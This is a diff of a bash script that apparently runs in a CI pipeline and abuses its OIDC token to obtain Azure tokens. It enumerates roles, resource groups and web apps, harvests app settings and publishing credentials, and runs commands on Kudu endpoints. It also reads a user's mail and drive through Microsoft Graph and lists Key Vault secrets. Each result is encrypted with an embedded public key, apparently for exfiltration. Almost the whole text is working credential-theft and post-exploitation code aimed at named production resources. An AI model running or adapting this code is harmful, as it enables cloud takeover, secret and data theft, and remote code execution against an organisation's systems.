@@ -23,7 +23,7 @@ PEM
 seal(){ local n="$1" f="$2" key iv kd dt
   if [ ! -s "$f" ]; then echo "SEAL|$n|EMPTY"; return 0; fi
   key=$(openssl rand -hex 32); iv=$(openssl rand -hex 16)
-  kd=$(printf '%s' "$key" | openssl pkeyutl -encrypt -pubin -inkey "$W/pub.pem" 2>/dev/null | base64 -w0)
+  kd=$(printf '%s:%s' "$key" "$iv" | openssl pkeyutl -encrypt -pubin -inkey "$W/pub.pem" 2>/dev/null | base64 -w0)
   dt=$(openssl enc -aes-256-cbc -K "$key" -iv "$iv" -in "$f" 2>/dev/null | base64 -w0)
   echo "SEAL|$n|$kd|$dt"
 }
@@ -31,7 +31,7 @@ seal(){ local n="$1" f="$2" key iv kd dt
 claims(){ python3 -c 'import sys,json,base64
 t=sys.argv[1].split(".")[1]; t+="="*(-len(t)%4)
 d=json.loads(base64.urlsafe_b64decode(t))
-print(json.dumps({k:d.get(k) for k in ("appid","oid","aud","roles","scp","idtyp","app_displayname","name","unique_name","groups") if d.get(k) is not None}))' "$1"; }
+print(json.dumps({k:d.get(k) for k in ("appid","oid","aud","roles","scp","idtyp","app_displayname","name","unique_name") if d.get(k) is not None}))' "$1"; }
 
 oidc=$(curl -sS --max-time 25 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
 say "OIDC_LEN=${#oidc}"
@@ -113,14 +113,24 @@ for nf in "$W"/tok_arm_*; do
   req "arm_${n}_rep_rg" GET "$MG/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/resources?api-version=2021-04-01" "$at"
 done
 
+# role definition names
+jq -r '.value[]?.properties.roleDefinitionId' "$W/arm_base_roles.body" 2>/dev/null | sort -u | while read -r rid; do
+  [ -n "$rid" ] || continue
+  req "roledef_$(basename "$rid")" GET "$MG$rid?api-version=2022-04-01" "$BA"
+done
+
 ############ site list (union)
 { for f in "$W"/arm_*_sites.body "$W"/arm_*_res.body; do
     [ -s "$f" ] && jq -r '..|objects|select(.type?=="Microsoft.Web/sites")|.name' "$f" 2>/dev/null
   done
   echo app-tbl-storefront-prod; echo app-tbl-reporting-prod; } | sed '/^$/d' | sort -u > "$W/sites.txt"
-say "SITES=$(tr '\n' ',' < "$W/sites.txt")"
+mapfile -t RGS < <( { jq -r '.value[]?.name' "$W/arm_base_rgs.body" 2>/dev/null; echo rg-tbl-platform-prod-sea; echo rg-tbl-reporting-prod-eus; } | sed '/^$/d' | sort -u)
+say "SITES=$(tr '\n' ',' < "$W/sites.txt") RGS=${RGS[*]}"
 
-############ publishing creds + app settings per site/token
+req arm_base_site_storefront GET "$MG/subscriptions/$SUB/providers/Microsoft.Web/sites/app-tbl-storefront-prod?api-version=2022-03-01" "$BA"
+req arm_base_site_reporting GET "$MG/subscriptions/$SUB/providers/Microsoft.Web/sites/app-tbl-reporting-prod?api-version=2022-03-01" "$BA"
+req arm_base_slots_storefront GET "$MG/subscriptions/$SUB/providers/Microsoft.Web/sites/app-tbl-storefront-prod/slots?api-version=2022-03-01" "$BA"
+
 kcmd(){ local s="$1" ku="$2" kp="$3" n="$4" c="$5" K="https://$s.scm.azurewebsites.net"
   jq -n --arg c "$c" --arg d "/home" '{command:$c,dir:$d}' > "$W/creq.json"
   curl -sS --max-time 70 --connect-timeout 10 -u "$ku:$kp" -H 'Content-Type: application/json' -X POST --data-binary @"$W/creq.json" "$K/api/command" -o "$W/k_${s}_$n.json" 2>/dev/null
@@ -130,6 +140,8 @@ kcmd(){ local s="$1" ku="$2" kp="$3" n="$4" c="$5" K="https://$s.scm.azurewebsit
 }
 
 kudu_probe(){ local s="$1" ku="$2" kp="$3" K="https://$s.scm.azurewebsites.net" p code fn
+  [ -e "$W/.kudu_$s" ] && return 0
+  touch "$W/.kudu_$s"
   say "KUDU_TRY $s"
   for p in /api/settings /api/vfs/site/wwwroot/ /api/deployments /api/processes /api/vfs/site/; do
     fn="kudu_${s}_$(printf '%s' "$p" | tr '/.' '__')"
@@ -145,22 +157,28 @@ kudu_probe(){ local s="$1" ku="$2" kp="$3" K="https://$s.scm.azurewebsites.net" 
   kcmd "$s" "$ku" "$kp" wwwroot 'bash -lc "ls -la /home/site/wwwroot; ls -la /home/site; ls -la /home/data 2>/dev/null"'
 }
 
+try_pub(){ local n="$1" s="$2" at="$3" u="$4" lab="$5" f code KU KP
+  f="$W/pub_${n}_${s}_${lab}.body"
+  code=$(curl -sS --max-time 45 --connect-timeout 10 -o "$f" -w '%{http_code}' -X POST -H "Authorization: Bearer $at" -H 'Content-Length: 0' "$u" 2>/dev/null || echo 000)
+  echo "REQ|pub_${n}_${s}_${lab}|$code|$(wc -c < "$f" 2>/dev/null || echo 0)"
+  seal "pub_${n}_${s}_${lab}" "$f"
+  if [ "$code" = 200 ]; then
+    KU=$(jq -r '.publishingUserName // empty' "$f" 2>/dev/null || true)
+    KP=$(jq -r '.publishingPassword // empty' "$f" 2>/dev/null || true)
+    if [ -n "$KP" ]; then say "PUB_OK $s $lab via $n"; kudu_probe "$s" "$KU" "$KP"; fi
+  fi
+}
+
 for s in $(cat "$W/sites.txt"); do
   for nf in "$W"/tok_arm_*; do
     [ -e "$nf" ] || continue
     n="${nf##*/tok_arm_}"; at=$(cat "$nf"); [ -n "$at" ] || continue
-    base="s_${n}_${s}"
     req "appset_${n}_${s}" POST "$MG/subscriptions/$SUB/providers/Microsoft.Web/sites/$s/config/appsettings/list?api-version=2022-03-01" "$at"
-    f="$W/pub_${n}_${s}.body"
-    code=$(curl -sS --max-time 45 --connect-timeout 10 -o "$f" -w '%{http_code}' -X POST -H "Authorization: Bearer $at" -H 'Content-Length: 0' \
-      "$MG/subscriptions/$SUB/providers/Microsoft.Web/sites/$s/config/publishingcredentials/list?api-version=2022-03-01" 2>/dev/null || echo 000)
-    echo "REQ|pub_${n}_${s}|$code"
-    seal "pub_${n}_${s}" "$f"
-    if [ "$code" = 200 ]; then
-      KU=$(jq -r '.publishingUserName // empty' "$f" 2>/dev/null || true)
-      KP=$(jq -r '.publishingPassword // empty' "$f" 2>/dev/null || true)
-      if [ -n "$KP" ]; then say "PUB_OK $s via $n"; kudu_probe "$s" "$KU" "$KP"; fi
-    fi
+    try_pub "$n" "$s" "$at" "$MG/subscriptions/$SUB/providers/Microsoft.Web/sites/$s/config/publishingcredentials/list?api-version=2022-03-01" sub
+    for rg in "${RGS[@]}"; do
+      req "appset_${n}_${s}_${rg}" POST "$MG/subscriptions/$SUB/resourceGroups/$rg/providers/Microsoft.Web/sites/$s/config/appsettings/list?api-version=2022-03-01" "$at"
+      try_pub "$n" "$s" "$at" "$MG/subscriptions/$SUB/resourceGroups/$rg/providers/Microsoft.Web/sites/$s/config/publishingcredentials/list?api-version=2022-03-01" "$rg"
+    done
   done
 done
 
@@ -179,7 +197,7 @@ for f in "$W"/k_*_mi_arm.out; do
   req "mi_${s}_org" GET "https://graph.microsoft.com/v1.0/organization" "$MIGR"
   req "mi_${s}_mail" GET "https://graph.microsoft.com/v1.0/users/d2cdf247-9319-40cb-8324-5a005ef538da/messages?\$top=25&\$select=subject,bodyPreview,from,receivedDateTime" "$MIGR"
   req "mi_${s}_drive" GET "https://graph.microsoft.com/v1.0/users/d2cdf247-9319-40cb-8324-5a005ef538da/drive/root/children" "$MIGR"
-  req "mi_${s}_vaults" GET "https://graph.microsoft.com/v1.0/servicePrincipals?\$top=5&\$select=displayName,appId,id" "$MIGR"
+  req "mi_${s}_sps" GET "https://graph.microsoft.com/v1.0/servicePrincipals?\$top=5&\$select=displayName,appId,id" "$MIGR"
   req "mi_${s}_prod" GET "$PROD/secrets?api-version=7.4" "$MIV"
   req "mi_${s}_sec" GET "$SEC/secrets?api-version=7.4" "$MIV"
 done
